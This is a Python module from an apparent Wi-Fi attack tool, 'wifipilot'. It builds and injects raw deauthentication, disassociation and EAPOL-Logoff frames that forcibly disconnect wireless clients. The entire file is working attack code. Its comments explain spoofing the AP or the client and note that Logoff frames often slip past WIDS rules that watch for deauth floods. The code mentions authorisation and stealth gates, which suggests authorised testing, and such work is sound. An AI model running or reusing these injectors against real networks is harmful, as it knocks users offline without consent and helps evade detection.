"""Raw frame injection: the frames no external tool sends for us.

wifipilot's attacks normally drive the aircrack-ng suite, because those tools are
battle-tested and their output is what an operator already trusts.  A few techniques
exist that no packaged tool implements cleanly, and this module builds exactly those
frames and hands them to the kernel:

* **EAPOL-Logoff** (``build_eapol_logoff``) — a supplicant is supposed to accept an
  EAPOL-Logoff from its authenticator without any cryptographic check, so an AP-shaped
  frame with the client's MAC as the source disconnects it.  It is the quiet cousin of
  a deauthentication frame: many WIDS rule sets key on deauth frames specifically, and
  a Logoff often lands where a deauth does not.  Unlike a deauth, it does nothing if
  802.11w is required, because it is not a management frame.
* **Deauthentication / disassociation** (``build_deauth``) — the same frame
  ``aireplay-ng --deauth`` sends, built here so targeted single-frame tests do not
  need a second tool.

Both are transmitted through ``AF_PACKET`` on a monitor interface, which is why every
caller is gated twice: the authorisation prompt (an attack that injects refuses to run
without it) and ``Config.stealth`` (which turns transmission off entirely).  The
sender is deliberately dumb — one frame, one ``sendto`` — so nothing here can turn
into a flood by accident; the flood attacks use mdk4, which has rate control.
"""

from __future__ import annotations

import os
import socket
import struct
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Sequence, Tuple

from .pcap import SUBTYPE_ASSOC_REQ, SUBTYPE_AUTH, SUBTYPE_DEAUTH, SUBTYPE_DISASSOC
from .util import mac_norm

__all__ = ["RADIOTAP", "build_radiotap", "EAPOL_LOGOFF", "build_eapol_logoff",
           "build_deauth", "build_qos_eapol", "RawInjector", "injection_available",
           "header_offset", "frame_only", "describe", "eapol_logoff_burst",
           "ETHERTYPE_EAPOL", "SUBTYPE_NAMES"]

ETHERTYPE_EAPOL = 0x888E

#: EAPOL packet types (802.1X-2010 table 11-3)
EAPOL_EAP_PACKET, EAPOL_START, EAPOL_LOGOFF, EAPOL_KEY, EAPOL_ENCAPSULATED_ASF = \
    0, 1, 2, 3, 4

#: LLC/SNAP header with the EAPOL ethertype: every EAPOL frame starts like this
LLC_SNAP_EAPOL = b"\xaa\xaa\x03\x00\x00\x00\x88\x8e"

SUBTYPE_NAMES = {SUBTYPE_ASSOC_REQ: "association request", SUBTYPE_AUTH: "authentication",
                 SUBTYPE_DEAUTH: "deauthentication", SUBTYPE_DISASSOC: "disassociation"}

#: EAPOL packet types, named: "EAPOL" on its own tells an operator nothing, and the
#: difference between a Key frame and a Logoff is the whole attack
EAPOL_TYPE_NAMES = {EAPOL_EAP_PACKET: "EAPOL-EAP", EAPOL_START: "EAPOL-Start",
                    EAPOL_LOGOFF: "EAPOL-Logoff", EAPOL_KEY: "EAPOL-Key",
                    EAPOL_ENCAPSULATED_ASF: "EAPOL-ASF"}

#: a minimal radiotap header: version 0, no present flags, length 8
RADIOTAP = b"\x00\x00\x08\x00\x00\x00\x00\x00"
#: the same header plus a rate field (500 kb/s units) — some drivers want the rate
#: the frame is transmitted at, and 2 Mb/s is what a management frame uses
_RADIOTAP_RATE = b"\x00\x00\x09\x00\x02\x00\x00\x00\x04"


def build_radiotap(rate: int = 0) -> bytes:
    """A radiotap header, optionally with a transmit rate in 500 kb/s units."""
    if rate:
        return b"\x00\x00\x09\x00\x02\x00\x00\x00" + bytes([rate & 0xFF])
    return RADIOTAP


def _mac_bytes(mac: str) -> bytes:
    clean = mac_norm(mac)
    if not clean:
        raise ValueError(f"not a MAC address: {mac!r}")
    return bytes(int(part, 16) for part in clean.split(":"))


#: frame-control bits: protocol version (0-1), type (2-3), subtype (4-7)
FC_MGMT, FC_DATA = 0, 2
FC_FROM_DS, FC_TO_DS = 0x02, 0x01
FC_QOS_DATA = 0x08


def frame_control(frame_type: int, subtype: int, flags: int = 0) -> int:
    """Pack the first frame-control byte (type/subtype) and return both bytes."""
    return (((frame_type & 0x03) << 2) | ((subtype & 0x0F) << 4), flags & 0xFF)


def _mgmt_header(subtype: int, addr1: str, addr2: str, addr3: str) -> bytes:
    """A 24-byte management header: frame control, duration, three addresses, seq."""
    control, flags = frame_control(FC_MGMT, subtype)
    return (struct.pack("<BB", control, flags) + b"\x00\x00"
            + _mac_bytes(addr1) + _mac_bytes(addr2) + _mac_bytes(addr3)
            + b"\x00\x00")


def build_deauth(bssid: str, client: str = "ff:ff:ff:ff:ff:ff", reason: int = 7,
                 disassociate: bool = False, station_is_source: bool = False) -> bytes:
    """A deauthentication (or disassociation) frame, with a radiotap header.

    ``station_is_source`` builds the *client-spoofed* variant of the classic
    "deauth the client from itself": address 2 (the transmitter) is the station, so
    an AP that validates the transmitter address still processes it.  Both variants
    are used in the field; neither is authenticated unless 802.11w is in force.
    """
    subtype = SUBTYPE_DISASSOC if disassociate else SUBTYPE_DEAUTH
    if station_is_source:
        header = _mgmt_header(subtype, bssid, client, bssid)
    else:
        header = _mgmt_header(subtype, client, bssid, bssid)
    body = struct.pack("<H", max(0, min(65535, int(reason))))[:2]
    return build_radiotap(rate=2) + header + body


def build_eapol_logoff(bssid: str, client: str,
                       version: int = 1) -> bytes:
    """An EAPOL-Logoff frame, addressed to the client as if the AP sent it.

    The frame is three fields long — version, type, length — and carries no
    cryptographic material, because the original 802.1X design has no way to
    authenticate a Logoff.  That is the whole attack: an unauthenticated frame that
    makes a supplicant tear down its session.
    """
    return _data_eapol(bssid, client, EAPOL_LOGOFF, version=version, qos=False)


def build_qos_eapol(bssid: str, client: str, payload_type: int = EAPOL_LOGOFF,
                    version: int = 1) -> bytes:
    """The QoS-data variant of an EAPOL frame (the WMM/WDS shape clients see).

    Most modern clients negotiate WMM, and some drivers drop un-QoS'd data frames
    addressed to an associated station, so the logoff attack sends both shapes.
    """
    return _data_eapol(bssid, client, payload_type, version=version, qos=True)


def _data_eapol(bssid: str, client: str, payload_type: int, version: int = 1,
                qos: bool = False) -> bytes:
    """One EAPOL frame in a data (or QoS-data) envelope, AP -> client."""
    body = (LLC_SNAP_EAPOL + bytes([version & 0x03, payload_type & 0xFF]) + b"\x00\x00")
    # from the AP to the client: FromDS, addr1 = client, addr2 = BSSID, addr3 = SA
    control, flags = frame_control(FC_DATA, 0x08 if qos else 0x00, FC_FROM_DS)
    header = (struct.pack("<BB", control, flags)
              + b"\x00\x00" + _mac_bytes(client) + _mac_bytes(bssid)
              + _mac_bytes(bssid) + b"\x00\x00")
    if qos:
        header += b"\x00\x00"                      # QoS control: TID 0, normal ack
    return build_radiotap(rate=2) + header + body


def injection_available(interface: str) -> bool:
    """Can we open an ``AF_PACKET`` socket on this interface?  (Linux, CAP_NET_RAW.)"""
    if not interface or not os.path.exists(f"/sys/class/net/{interface}"):
        return False
    if os.geteuid() != 0:                     # AF_PACKET needs CAP_NET_RAW
        return False
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0)
        try:
            sock.bind((interface, 0))
        finally:
            sock.close()
    except OSError:
        return False
    return True


@dataclass
class InjectionResult:
    """What a transmit attempt actually did."""

    sent: int = 0
    failed: int = 0
    interface: str = ""
    error: str = ""
    started: float = field(default_factory=time.time)

    @property
    def ok(self) -> bool:
        return self.sent > 0 and not self.error

    @property
    def duration(self) -> float:
        return max(0.0, time.time() - self.started)

    def to_dict(self) -> Dict[str, Any]:
        return {"sent": self.sent, "failed": self.failed, "interface": self.interface,
                "error": self.error, "ok": self.ok, "seconds": round(self.duration, 2)}


class RawInjector:
    """Send pre-built frames on a monitor interface.

    Deliberately small: it opens one ``AF_PACKET`` socket, sends the frames it is
    given, and closes it.  Rate limiting is the caller's business, because the
    caller is the only one that knows whether it is sending one frame or a test.
    """

    def __init__(self, interface: str, rate_limit: float = 0.0) -> None:
        self.interface = interface
        self.rate_limit = max(0.0, rate_limit)
        self.result = InjectionResult(interface=interface)
        self._sock: Optional[socket.socket] = None

    # ---------------------------------------------------------------- #
    def open(self) -> bool:
        if self._sock is not None:
            return True
        if not self.interface:
            self.result.error = "no interface to inject on"
            return False
        if not os.path.exists(f"/sys/class/net/{self.interface}"):
            self.result.error = f"{self.interface} does not exist"
            return False
        try:
            self._sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0)
            self._sock.bind((self.interface, 0))
        except OSError as exc:
            self._sock = None
            self.result.error = (f"cannot open AF_PACKET on {self.interface}: {exc} "
                                 f"(need root/CAP_NET_RAW and a monitor interface)")
            return False
        return True

    def send(self, frames: Sequence[bytes]) -> InjectionResult:
        """Send every frame, counting successes and failures."""
        if not self.open():
            return self.result
        assert self._sock is not None
        last = 0.0
        for frame in frames:
            if self.rate_limit:
                wait = self.rate_limit - (time.time() - last)
                if wait > 0:
                    time.sleep(wait)
            last = time.time()
            try:
                self._sock.send(frame)
                self.result.sent += 1
            except OSError as exc:
                self.result.failed += 1
                self.result.error = str(exc)
                if self.result.failed >= 5:
                    break
        return self.result

    def close(self) -> None:
        if self._sock is not None:
            try:
                self._sock.close()
            except OSError:                       # pragma: no cover
                pass
            self._sock = None

    def __enter__(self) -> "RawInjector":
        self.open()
        return self

    def __exit__(self, *exc_info: Any) -> None:
        self.close()


def frame_only(frame: bytes) -> bytes:
    """The 802.11 frame from a built frame (radiotap header removed).

    Useful for tests and for writing a pcap: ``pcap``/``synth.write_pcap`` add their
    own radiotap header, so a built frame must be stripped before it goes in.
    """
    return frame[header_offset(frame):]


def eapol_logoff_burst(bssid: str, client: str, count: int = 3,
                       interval: float = 0.05, qos: bool = False) -> List[bytes]:
    """The frames a logoff attempt sends, both shapes, for one client."""
    build = build_qos_eapol if qos else build_eapol_logoff
    return [build(bssid, client) for _ in range(max(1, int(count)))]


def header_offset(frame: bytes) -> int:
    """Where the 802.11 header starts: the radiotap header's own length field."""
    if len(frame) < 4:
        return 0
    return struct.unpack_from("<H", frame, 2)[0]


def describe(frames: Sequence[bytes]) -> List[Tuple[str, int]]:
    """``(kind, length)`` for a list of built frames — used by the CLI and the UI."""
    out: List[Tuple[str, int]] = []
    for frame in frames:
        offset = header_offset(frame)
        if len(frame) <= offset:
            out.append(("truncated", len(frame)))
            continue
        control = frame[offset]
        ftype = (control >> 2) & 0x03
        subtype = (control >> 4) & 0x0F
        if ftype == 2:
            kind = "data"
            base = frame.find(LLC_SNAP_EAPOL, offset)
            if base >= 0:
                version_at = base + len(LLC_SNAP_EAPOL)
                packet_type = frame[version_at + 1] if version_at + 1 < len(frame) else -1
                kind = EAPOL_TYPE_NAMES.get(packet_type, "EAPOL")
        else:
            kind = SUBTYPE_NAMES.get(subtype, f"subtype {subtype}")
        out.append((kind, len(frame)))
    return out
